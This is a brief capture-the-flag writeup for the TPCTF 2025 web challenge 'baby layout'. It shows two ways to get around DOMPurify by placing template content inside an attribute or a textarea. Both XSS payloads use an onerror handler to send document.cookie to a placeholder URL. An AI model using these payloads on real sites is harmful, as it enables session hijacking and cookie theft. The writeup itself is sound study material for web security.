---
title: "baby layout - TPCTF 2025"
category: "web"
type: "writeup"
tags: ["html", "dompurify", "web", "baby", "layout", "tpctf", "tpctf-2025", "2025", "ctf-writeup"]
summary: "One solution is to put {{content}} inside an attribute and to close the quote in the inner payload:"
source:
  name: "CTFtime writeup #40070"
  url: "https://ctftime.org/writeup/40070"
original_source: "https://ouuan.moe/post/2025/03/tpctf-2025#baby-layout-81-solves"
ctf:
  name: "TPCTF 2025"
  year: 2025
  challenge: "baby layout"
---

## Metadata

- **CTF:** TPCTF 2025
- **Task:** baby layout
- **Author team:** TP-Link
- **CTFtime tags:** html, dompurify, web
- **CTFtime:** <https://ctftime.org/writeup/40070>
- **Original writeup:** <https://ouuan.moe/post/2025/03/tpctf-2025#baby-layout-81-solves>

---
One solution is to put `{{content}}` inside an attribute and to close the quote in the inner payload:

```html  
![](https://ctftime.org/{{content}})  
```

```html  
" onerror="fetch('{YOUR_URL}'+document.cookie)  
```

An alternative solution is to close a `<textarea>`, like [Bad usage | Not enough context | Exploring the DOMPurify library: Hunting for Misconfigurations (2/2) | [mizu.re](http://mizu.re)](<https://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations#bad-usage-not-enough-context):>

```html  
<textarea>{{content}}</textarea>  
```

```html  
<div id="</textarea><img src=x onerror=fetch('{YOUR_URL}'+document.cookie)>"></div>  
```
